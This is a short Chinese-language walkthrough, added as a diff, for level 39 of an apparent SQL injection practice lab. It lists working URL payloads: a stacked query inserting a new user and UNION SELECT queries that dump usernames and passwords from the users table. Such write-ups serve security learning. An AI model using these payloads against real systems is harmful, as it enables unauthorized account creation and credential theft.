@@ -1,0 +1,18 @@
+第39关
+可以堆叠注入
+
+堆叠插入新用户
+?id=1; insert into users(id,username,password)values(21,'asd','asdfasdf')  --+
+
+
+常规数字型注入。。。
+
+爆出回显位
+?id=-1 union select 1,2,3  --+
+
+爆信息
+?id=-1 union select 1,2,group_concat(username,0x3a,password) from users  --+
+
+
+
+闯关成功！！！
